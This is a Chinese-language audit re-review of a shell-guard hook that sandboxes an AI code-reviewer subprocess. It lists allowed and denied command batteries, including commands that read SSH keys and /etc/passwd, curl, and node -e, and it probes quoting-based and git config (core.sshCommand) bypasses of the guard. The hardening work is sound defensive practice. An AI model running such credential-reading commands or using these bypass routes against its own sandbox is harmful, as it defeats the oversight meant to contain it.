| P2-7 | `stub-claude.mjs` 永远 `exit(0)` | **已覆盖**（方案比报告建议的更巧）：`cross-cases` 的新用例 **C22** 在自己的 tmp 目录里写了一个**一次性 crash CLI**（`--version`/`--help` 正常应答，其余一律 `exit(7)`），用它跑一遍 review，断言"CLI 非零退出且没有 result JSON → 判为失败评审并报出退出码"。这样既覆盖了 `claude.js` 的崩溃/无结果分支，又**不动共享 stub 的契约**。 |
| P2-9 | `buildFallbackPrompt` 是死代码 | **仍未修**。仍在 `index.js:37` 被导入但从未调用（只有 `audit-fixes-test.mjs:484` 在测它）。 |
| P2-11 | `shell-guard.js` 里的 sed 处理不可达 | **我的这条记录是错的**——sed 分支在 1.18.2 的修复轮里**已经删掉了**（当前文件里只剩 3 处**注释**提到 sed：`PIPE_SINKS` 的历史说明、`sed is not a permitted sink` 的提示文案、以及告警文案里列举的 `sed -i`；`FLAG_KINDS.sed` / `OUTRIGHT_DENY.sed` / `prog === "sed"` **均无匹配**）。我上一轮只按"文件改过"推断它没修，没有实测——教训记下。 |

### 9.5 测试门禁

```
PASS  shell-guard      exit 0  (1.0s)
PASS  audit-fixes      exit 0  (2.3s)
PASS  p0-regression    exit 0  (4.4s)
PASS  smoke            exit 0  (0.5s)
PASS  validation       exit 0  (1.3s)
PASS  cross-cases      exit 0  (115.4s)   ALL CASES PASS: 139/139
TOTAL: 6 passed, 0 failed  [124.9s]
```

cross-cases 从 136 增到 **139**（新增 C22 三条）。`p0-regression` 现在是**必需套件**（文件缺失即 FAIL），所以上一轮指出的"删掉 P0 套件 CI 依然绿"已经不可能。

### 9.6 回归检查：48 条真实 reviewer 命令

用 SKILL.md / 提示词里**实际会让 reviewer 跑的命令**做电池测试：

- **47/47 条合法命令仍然 ALLOWED**：`git status --porcelain`、`git diff`、`git diff --cached`、`git show --stat HEAD`、`git log --oneline main..HEAD`、`git diff main...HEAD`、`git log -p --follow <file>`、`git blame -L 10,20 <file>`、`git rev-parse --abbrev-ref origin/HEAD`、`git remote show origin`、`git remote -v`、`git branch -a/-vv/--show-current`、`git stash list`、`git ls-files`、`git ls-tree -r HEAD`、`gh pr view/diff/list/checks/repo view`、`find`/`rg`/`ls`/`grep` 各种读法、`git log --format="%h; %s"`（含分号的引号形式）、`git show HEAD && echo "=====" && git log`（**策略文档明确允许的分隔符链**）、全部管道 sink（head/tail/wc/grep/sort/cut/uniq/tr）。
- **16/16 条危险命令仍然 DENY**：`echo $VAR`、`echo ~/*`、命令替换、`find -exec/-delete`、`rg --pre`、`git diff --output=`、`cat ~/.ssh/id_rsa`、`ls /etc`、重定向、`&`、`git merge`、`git push`、`curl`、`node -e`、`sed -i`、`sort -o`。
- 唯一的过拒是 §9.3 记的那一条（`echo` + 单引号字面 `$`）。

### 9.7 文档承诺核对表（复核后）

§3.1 的 12 条承诺**现在全部在代码里成立**。`SECURITY.md` 本轮**未改动**——但这是对的：它写的正是"每条防线都成立"的**意图**，现在代码兑现了它，而不是反过来去改文档。

### 9.8 复核后新增的一层纵深防御（超出报告建议，值得单独记一笔）

修复给**评审子进程**的 git 注入了 7 个 `GIT_CONFIG_*` 命令级覆盖（`core.sshCommand` / `core.fsmonitor` / `core.pager` / `core.hooksPath` / `diff.external` / `credential.helper` / `core.attributesFile`）。这一层的价值在于**它不依赖扫描器**：仓库可以命名扫描器没预料到的键，但命令级覆盖会压过任何配置文件。

实测（真实 git + 真实仓库配置）：

```
A) 不带覆盖：   git remote show origin  →  sshCommand EXECUTED
B) 带覆盖：     git remote show origin  →  NOT executed（覆盖压过了仓库配置）
C) buildClaudeEnv() 的子进程环境：
     GIT_CONFIG_COUNT = 7
     core.sshCommand=""  core.fsmonitor=""  core.pager="cat"  core.hooksPath=""
     diff.external=""    credential.helper=""  core.attributesFile=""
```

（宿主持有的 `GIT_CONFIG_COUNT` 会被保留，条目追加在它后面——服务器不会静默丢掉调用方注入的配置。）

---

## 10. 复核（第二轮修复：过拒修复 + 策略指纹）

**复核时间**：2026-10-29 晚 · **被复核版本**：v1.18.2（PR #2 的最新提交，含过拒修复 commit `0e71030`）

### 10.1 过拒修复（P2-13）：**已修，且实现比报告建议的更严谨**

修复方式不是"放过 `$`"，而是**让 tokenizer 保留引号信息**：`parseCommand` 为每个 word 记录 `quoted` 标志（引号内字符、引号开启、反斜杠转义都会置位），随 segment 传给策略层；`echo` 不再做路径校验（它只打印字面量，不读文件——这正是我对 `tr` 那条的更正所指），改为只拒绝**未加引号的**通配符与 `~`。

**实测（真实 hook 进程）**：

```
ALLOW  echo 'price: $5'      ALLOW  echo '$HOME'      ALLOW  echo '*'
ALLOW  echo '/Users/kent'    ALLOW  echo "====="      ALLOW  echo '~'      ALLOW  echo "~"
ALLOW  echo '~/*'            ALLOW  echo "*"         ALLOW  echo "a*b"    ALLOW  echo "[1] done"
DENY   echo $HOME            DENY   echo "$HOME"      DENY   echo *        DENY   echo ~/*
DENY   echo ../*             DENY   echo ~            DENY   echo [1]
```

**关键正确性检验（我加的）**：带引号的 token **不能**绕过**读文件**程序的路径校验——

```
DENY  cat '/etc/passwd'    DENY  ls '/etc'      DENY  grep -rn x '/etc/passwd'
DENY  find '/etc' -name passwd    DENY  rg -n x '/etc/passwd'
DENY  head -5 '/etc/passwd'    DENY  wc -l '/etc/passwd'
DENY  cat '~/.ssh/id_rsa'    DENY  cat '$HOME/.ssh/id_rsa'    DENY  ls '~'
```

**部分引用（一个 per-word 标志最容易漏的经典绕过）也处理正确**：

```
DENY   echo $HOME'x'        ← bash 真的会展开（实测 bash 输出 /Users/kentx...）→ 必须拒
ALLOW  echo '$HOME'x        ← 字面量 → 可以放行
ALLOW  echo pre'$HOME'post  ← 字面量 → 可以放行
DENY   echo $HOME"x"        ← 双引号段仍展开 → 必须拒
DENY   echo $'ANSI'         ← ANSI-C 引用会展开 → 必须拒
DENY   cat /etc/passwd'x'   DENY  cat '/etc/passwd'x
```

即实现是**按字符片段**判定引号保护，不是按整个 word —— 这正是 per-word 标志会漏掉的那一类。**没有新洞。**

### 10.2 策略指纹：文档承诺表 #7 **第一次成真**（我实测了它）

`FIXES-round2.md` 新增了一节"策略指纹"：hook 在 `CC_REVIEW_GUARD_INFO=1` 模式下输出 `policyFingerprint()`（`BASH_POLICY` + `PIPE_SINKS` + `FLAG_KINDS` + `OUTRIGHT_DENY` + `FIND_WRITE_FLAGS` + `MAX_SEGMENTS` 的规范化 JSON 的 sha256 前 16 位），`guardSelfTestProbe` 把它与进程内的指纹比对，不一致就拒绝运行。

**实测（真实 MCP stdio 服务 + 真实升级模拟）**：在 `/tmp` 的副本里启动服务（进程内策略 A），随后**改磁盘上的 `src/shell-guard.js`**（策略 B，即一次未重启的升级），再发第一次 review 请求：

```
isError: true
Refusing to run unguarded: the shell guard is installed but did not behave as expected
(the hook on disk enforces a different policy than this process
 (server 9e7a0037f6fbd5b7, hook 52659ea60bb879de) — this process is still running the
 previous version while the hook file is the new one. Restart the MCP host (or ZCode)
 to apply the upgrade.)
```

**这正是我原来列为"承诺为假"的那一条**（旧实现的自检探针是结构性的，新旧策略下都通过，所以没有任何东西会拒绝运行）。现在真的会拒。

> **我第一次的测法是错的**：我先调了一次 review（把自检结果缓存成"匹配"），再改磁盘文件，第二次调用当然不会拒——撞上了 5 分钟的自检缓存。按真实顺序（先升级、后第一次调用）重测才得到上面的结果。

### 10.3 复核中新发现的一条残余（低severity）

**P2-14 策略指纹比对挂在 5 分钟自检缓存里 → 升级后最长 5 分钟的窗口不拒绝**
**文件**：`src/claude.js`（`guardSelfTest()` 的 `SELF_TEST_TTL_MS = 5 * 60 * 1000` 缓存；指纹比对在其内部）

`prepareRunHardening()` 调的是 `guardSelfTest()`（**不带 `refresh`**），而指纹比对是这个自检结果的一部分。于是：**上一次自检跑过之后的 5 分钟内发生升级，紧接着的第一次 review 会命中缓存的 "ok"，不比对指纹、不拒绝**。这恰好是"升级后立刻复跑一次 review 验证"这个最常见的动作会命中的窗口。

**影响有限，不是绕过**：hook 是执行点，磁盘上的策略 B **始终**被强制执行；进程内的旧策略 A 只影响 (a) 权限 allowlist 的渲染、(b) 报告里 `guardBlocked` / `realDenials` 的分类。两层取交集，**没有哪条被新策略禁止的命令能跑起来**；最坏情况是这 ≤5 分钟内报告里的拒绝分类可能标错。

**修法**：指纹比对不应被 TTL 缓存——它是一次 ~50ms 的 spawn，比 mtime 扫描（`codeDrift()`）还便宜；把它拆出缓存，或在 `codeDrift()` 判定源码更新时强制 `refresh: true`。

### 10.4 `FIXES-round2.md` 的一条残余风险记录与代码不符（低severity，文档项）

该文件"残余风险"里写：**"echo 的方括号规则 quote-blind（`echo "[1] done"` 会被拒）"**。

**实测与代码不符**：`shell-guard.js:591` 的判据是 `!quoted[i + 1] && (w.startsWith("~") || /[?*\[\]]/.test(w))` —— 方括号检查**已经带引号判定**。实测 `echo "[1] done"` / `echo '[1] done'` / `echo "[1]"` / `echo "a*b"` / `echo "?"` **全部 ALLOW**，只有未加引号的 `echo [1]` / `echo a*b` / `echo ?` 被 DENY。

这条记录会让下一轮审计去追一个不存在的洞——建议删掉这一行（或者改成"方括号规则**已**引号感知"）。

### 10.5 其余复核结论

- **测试门禁**：`npm test` → 6 套件全过、0 失败、cross-cases **139/139**、退出码 0（付费套件按设计 SKIP 并逐条打印原因与对应 npm script）。
- **§9.2 的两条更正**已进 `CHANGELOG.md` 1.18.2 的 "Audit corrections recorded" 段落 ✓（`tr` 无 FILE 操作数、4100 文件的 fixture 无效、`echo /etc/passwd` 只打印字面量）。
- **P2-9 `buildFallbackPrompt`**：确认仍是死代码（`index.js:37` 导入、从不调用）。**故意保留**（`audit-fixes-test.mjs:484` 在测它，删函数要连带改断言）——判断合理：它不构成风险，留作下轮清理。

---



---

*本报告由 Lead 独立复核；所有 P0/P1 结论均标注了"实测复现"或"代码路径确认"，未采信任何专家的未验证结论。*
